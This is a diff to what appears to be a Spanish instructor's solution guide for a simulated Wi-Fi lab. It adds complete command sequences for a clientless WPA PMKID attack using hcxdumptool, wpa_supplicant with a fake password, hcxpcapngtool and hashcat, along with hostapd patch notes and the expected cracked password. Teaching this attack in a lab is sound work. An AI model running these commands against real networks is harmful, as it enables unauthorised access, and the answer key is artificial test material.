@@ -393,19 +393,116 @@ qué el PMKID es peligroso: el AP incluye el PMKID en el **primer mensaje (M1)**
 del 4-way durante la asociación, así que **no hace falta ningún cliente**:
 basta con provocar uno mismo la asociación para que el AP emita ese M1.
 
+Hay dos formas de provocar esa asociación. Las dos terminan igual:
+`hcxpcapngtool` extrae el PMKID (línea `WPA*01`) y `hashcat -m 22000` lo
+crackea.
+
 ```bash
-sudo iw dev wlan0 set channel 4
-
-# hcxdumptool fuerza la asociación contra el AP y recoge el PMKID solo
-sudo hcxdumptool -i wlan0 -w pmkid_nc.pcapng --rds=1
-# No aparecerá ningún cliente en airodump: el PMKID llega igual.
-
-# Extraer y crackear
-hcxpcapngtool -o hash_nc.22000 pmkid_nc.pcapng
-hashcat -m 22000 hash_nc.22000 /usr/share/wordlists/rockyou.txt
+# Localizar el objetivo
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon --band g       # he_pmkid_nc: CH 4, sin estaciones
+BSSID=<BSSID_PMKID_NC>
 ```
 
-**Resultado esperado:** `football`.
+### Método A: hcxdumptool (ataque *clientless* "real")
+
+hcxdumptool se hace pasar por un cliente con una MAC inventada, se autentica y
+se asocia con el AP, y guarda el M1 que este le envía.
+
+```bash
+# Interfaz limpia: hcxdumptool la pone en monitor él solo
+sudo hcxdumptool -i wlan1 -c 4a -w pmkid_nc.pcapng --rds=1
+#   -c 4a es imprescindible: por defecto solo salta por los canales 1, 6 y 11
+#   (la "a" indica la banda de 2,4 GHz). Sintaxis de la 6.3 y posteriores.
+#   Esperar a que la fila de he_pmkid_nc muestre "+" en la columna P y pulsar Ctrl+C.
+
+hcxpcapngtool -o pmkid_nc.22000 pmkid_nc.pcapng   # debe escribir una línea WPA*01
+hashcat -m 22000 pmkid_nc.22000 /usr/share/wordlists/rockyou.txt
+hashcat -m 22000 pmkid_nc.22000 --show
+```
+
+En la pantalla de hcxdumptool, las columnas `E A 1 2 3 P` de cada AP se marcan
+con `+`. Lo normal en este escenario es ver `+` en `E`, `A`, `1` y `P`, y nada
+en `2` ni en `3` (no hay clientes). Si `A` se queda en blanco, la asociación no
+se completa (ver más abajo: hostapd sin recompilar). Si `1` tiene `+` pero `P`
+no, el AP envía el M1 sin PMKID.
+
+**Requiere el hostapd recompilado con el parche del ACK.** Si
+`/usr/local/sbin/hostapd-pmkid` es anterior a ese parche:
+
+```bash
+sudo ./limpia.sh
+sudo ./compila_hostapd_pmkid.sh --force    # deben salir DOS "[OK] Parche aplicado"
+sudo ./despliegue.sh
+```
+
+### Método B: `wpa_supplicant` con una contraseña falsa
+
+El atacante se asocia como un cliente normal, con una contraseña cualquiera.
+El AP envía el M1 con el PMKID **antes** de comprobar nada. No necesita el
+hostapd recompilado con el parche del ACK.
+
+```bash
+# wlan1 en modo managed (si hcxdumptool la dejó en monitor)
+sudo ip link set wlan1 down; sudo iw dev wlan1 set type managed; sudo ip link set wlan1 up
+
+# Terminal 1: capturar en el canal 4
+sudo airodump-ng -c 4 --bssid $BSSID -w pmkid_nc wlan0mon
+
+# Terminal 2: asociarse con una contraseña falsa
+wpa_passphrase he_pmkid_nc contrasenafalsa > falso.conf
+sudo wpa_supplicant -D nl80211 -i wlan1 -c falso.conf
+#   ~10 s: saldrán errores de 4-way handshake (clave incorrecta). Ctrl+C
+
+# Extraer SOLO el PMKID y crackear
+hcxpcapngtool -o todo.22000 pmkid_nc-01.cap
+grep 'WPA\*01' todo.22000 > pmkid_nc.22000
+hashcat -m 22000 pmkid_nc.22000 /usr/share/wordlists/rockyou.txt
+```
+
+El `grep` es necesario: la captura también contiene el M2 que ha enviado
+`wpa_supplicant`, calculado con la contraseña falsa. hcxpcapngtool lo saca como
+`WPA*02`, y esa línea no tiene sentido crackearla.
+
+**Resultado esperado (ambos métodos):** `football`.
+
+### Por qué hubo que recompilar hostapd para el método A
+
+`compila_hostapd_pmkid.sh` aplica **dos** parches a hostapd 2.10. Los dos
+afectan solo al binario `hostapd-pmkid` (escenarios `he_pmkid` y
+`he_pmkid_nc`); el resto de escenarios usa el hostapd del sistema.
+
+1. **PMKID en el M1 con WPA-PSK** (`src/ap/wpa_auth.c`). El hostapd de serie
+   solo incluye el PMKID en el M1 con 802.1X, SAE u OWE. Sin este parche no
+   hay PMKID que capturar con ningún método. Reproduce el comportamiento de
+   muchos routers comerciales.
+2. **No exigir el ACK de la *Authentication/Association Response***
+   (`src/ap/ieee802_11.c`, `handle_auth_cb` y `handle_assoc_cb`). En 802.11 el
+   receptor de cada trama unicast la confirma con un ACK, y hostapd descarta a
+   la estación si no recibe el ACK de esas dos respuestas. En
+   `mac80211_hwsim` solo envían ACK las interfaces "activas" (managed, AP...).
+   La MAC inventada que inyecta hcxdumptool desde modo monitor no pertenece a
+   ninguna, así que nadie confirma las respuestas del AP. hostapd da la
+   asociación por fallida y **nunca envía el M1**.
+
+Síntoma sin el parche 2: la captura de hcxdumptool solo tiene un beacon y una
+*probe response*, y hcxpcapngtool avisa de que faltan tramas de autenticación y
+asociación (`no hashes written`). Para comprobarlo en directo:
+
+```bash
+sudo iw dev wlan0mon set channel 4
+sudo tcpdump -i wlan0mon -e -n "wlan addr3 $BSSID and not subtype beacon"
+# Se ve Authentication/Association, pero ninguna trama EAPOL del AP
+```
+
+El parche 2 solo cambia qué hace hostapd cuando **falta** el ACK. Los
+clientes legítimos y el método B (`wlan1` en managed) sí envían el ACK, así que
+siguen funcionando igual. El único efecto secundario es que cada intento de
+hcxdumptool deja una estación "fantasma" hasta que caduca por inactividad
+(unos 5 minutos).
+
+Es la misma limitación que impide el fake auth (`aireplay-ng -1`) en el
+escenario WEP.
 
 **Comparación (respuesta a la pregunta de la guía del alumno):**
 
@@ -425,8 +522,19 @@ hashcat -m 22000 hash_nc.22000 /usr/share/wordlists/rockyou.txt
   para su propia MAC.
 - **Qué se explota.** El AP envía el M1 **antes** de que el cliente haya
   demostrado conocer la clave: el atacante no necesita la contraseña para
-  provocarlo, ni tiene que enviar nunca un M2. Por eso el ataque es
-  *clientless* y más sigiloso: no hay deauth ni hay que esperar a nadie.
+  provocarlo. En el 4-way, quien demuestra conocer la clave es el cliente, con
+  el MIC del M2. Pero el PMKID ya va en el M1, que el AP envía sin verificación
+  previa. Por eso el ataque es *clientless* y más sigiloso: no hay deauth ni
+  hay que esperar a nadie.
+  - Con hcxdumptool (método A) el atacante ni siquiera envía un M2.
+  - Con `wpa_supplicant` (método B) se envía un M2 con una contraseña falsa,
+    pero da igual: el PMKID del M1 ya está capturado.
+- **Por qué sirve para crackear.** Todo lo que entra en la fórmula salvo la PMK
+  es público: "PMK Name" es una constante, la MAC del AP sale en el beacon y la
+  MAC de la estación la elige el atacante. Para cada contraseña candidata:
+  `PMK = PBKDF2(candidata, SSID, 4096)` → `HMAC-SHA1-128(PMK, …)`. Si el
+  resultado coincide con el PMKID capturado, la contraseña es esa. Es un
+  ataque offline de diccionario: solo caen contraseñas débiles.
 - **Contraste con el handshake clásico.** Sin clientes, el ataque al 4-way es
   imposible, porque nadie genera el M2 con el MIC. Con PMKID, un AP vacío
   sigue siendo atacable.
